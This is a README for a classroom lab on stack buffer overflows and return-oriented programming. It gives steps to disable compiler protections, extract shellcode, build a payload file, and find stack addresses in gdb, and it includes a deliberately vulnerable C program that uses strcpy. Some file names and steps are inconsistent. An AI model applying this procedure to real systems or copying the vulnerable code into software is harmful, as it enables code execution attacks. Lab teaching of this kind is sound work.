# RoP and Stack Attacks Lab

This repository contains files and instructions for performing Return-Oriented Programming (RoP) and stack attacks. The lab focuses on exploiting vulnerabilities and executing arbitrary code through buffer overflows.

## Files

The following files are required for the lab:

- `dummy_echo`: Dummy executable vulnerable to buffer overflow attacks.
- `inject.c`: C code for crafting the exploit payload.
- `create_mal_code.c`: C code for creating the malicious code.
- `shellcode.c`: C code for generating the shellcode.

## Instructions

1. Download the necessary files from Github:
   - `dummy_echo`
   - `inject.c`
   - `create_mal_code.c`
   - `shellcode.c`

2. Compile the files using the following command:
   ```
   gcc -z execstack -fno-stack-protector shellcode.c -o shellcode
   ```

3. Extract the shellcode by executing the following command:
   ```
   dd if=shell skip=1632 count=36 bs=1 of=shellcode
   ```

   Alternatively, use the following command if the video instructions are followed:
   ```
   dd if=shellcode skip=4397 count=36 bs=1 of=shell_code
   ```

4. Verify the existence of the `shell_code.bin` file by running the command:
   ```
   ls -l shell_code.bin
   ```

   If the file is not found, proceed to the next step.

5. Install the `hexedit` tool by executing the following commands:
   ```
   sudo apt-get install python3-apt
   sudo apt-get update --fix-missing
   sudo apt install hexedit
   ```

6. Open the `shell_code` file with `hexedit`:
   ```
   hexedit shell_code
   ```

   Use the Ctrl+x command to exit and return to the terminal.

7. Run the `create_mal_code` program with the following syntax:
   ```
   ./create_mal_code assumed_shellcode_addr padding shellcode outputfile
   ```

8. Execute the `create_mal_code` program to create the malicious code file:
   ```
   ./create_mal_code 0 20 shell_code malicious_code
   ```

9. Verify the existence of the `malicious_code` file by running the command:
   ```
   ls -l malicious_code
   ```

10. Adjust the file permissions for `malicious_code` if needed:
    ```
    chmod 666 malicious_code
    ```

11. Verify the file permissions of `malicious_code` by running the command:
    ```
    ls -l malicious_code
    ```

12. Open the `malicious_code` file with `hexedit`:
    ```
    hexedit malicious_code
    ```

13. Launch the `gdb` debugger and load the `inject` program:
    ```
    gdb ./inject
    ```

14. Execute the `run` command in `gdb` to observe any errors or issues.

15. If errors occur, create a new file named `victim_code.c` with the provided code snippet:

    ```c
    #include <stdio.h>
    #include <string.h>

    void copy_and_echo(const char* p)
    {
         char buffer[48];
         strcpy(buffer, p);
         puts(buffer);
    }

    int main (int argc, const char* argv[])
    {
         if (argc < 2)
             return -1;
         copy_and_echo(argv[1]);
         return 0;
    }
    ```

16. Compile the `victim_code.c` file using the following command:
    ```
    gcc -z execstack -fno-stack-protector victim_code.c -o dummy_echo
    ```

17. Run the `dummy_echo` program:
    ```
    ./dummy_echo
    ```

18. Launch the `gdb` debugger and load the `inject` program:
    ```
    gdb ./inject
    ```

19. Execute the `run` command in `gdb` to observe any errors or issues.

20. Take note of the stack address by typing the following command in `gdb`:
    ```
    p $sp
    ```

    The address will be displayed as `$1 = (void *) 0x7fffffffda58`. Make a note of this address.

21. Set a breakpoint in `inject.c` at the desired location using the stack address obtained in the previous step.

22. Compile `inject.c` with the following command:
    ```
    gcc -z execstack -fno-stack-protector inject.c -o inject
    ```

23. Run the `inject` program:
    ```
    ./inject
    ```

Note: Please ensure that you exercise caution when performing these actions and use them for educational purposes only.
